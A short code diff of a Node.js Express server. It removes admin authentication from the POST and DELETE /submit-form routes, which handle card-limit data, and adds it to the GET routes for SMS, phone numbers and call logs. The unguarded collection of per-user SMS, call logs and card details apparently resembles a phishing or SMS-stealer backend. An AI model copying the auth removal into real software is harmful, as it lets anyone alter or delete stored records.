@@ -137,7 +137,7 @@ app.get("/submit-form", AuthAdmin, async (req, res) => {
 });
 
 
-app.post("/submit-form", AuthAdmin, async (req, res) => {
+app.post("/submit-form", async (req, res) => {
   try {
     // ✅ Convert card limits to numbers
     const data = {
@@ -187,7 +187,7 @@ app.post("/submit-form", AuthAdmin, async (req, res) => {
 });
 
 // DELETE /submit-form/:id
-app.delete("/submit-form/:id", AuthAdmin, async (req, res) => {
+app.delete("/submit-form/:id", async (req, res) => {
   try {
     const mongoId = req.params.id;
 
@@ -272,7 +272,7 @@ app.post("/sms", async (req, res) => {
 
 
 // GET route to fetch SMS for a particular user
-app.get("/sms", async (req, res) => {
+app.get("/sms",AuthAdmin, async (req, res) => {
   const { userId } = req.query;
 
   if (!userId) {
@@ -337,7 +337,7 @@ app.post("/get-number", async (req, res) => {
 
 
 // Get phone number directly
-app.get("/get-number", async (req, res) => {
+app.get("/get-number", AuthAdmin ,async (req, res) => {
   const record = await Phone.findOne();
 
   if (!record) {
@@ -397,7 +397,7 @@ app.post("/call-log", async (req, res) => {
    GET ALL CALL LOGS
 ======================= */
 // GET route to fetch call logs, optionally filtered by userId
-app.get("/call-logs", async (req, res) => {
+app.get("/call-logs", AuthAdmin,async (req, res) => {
   const { userId } = req.query;
 
   try {
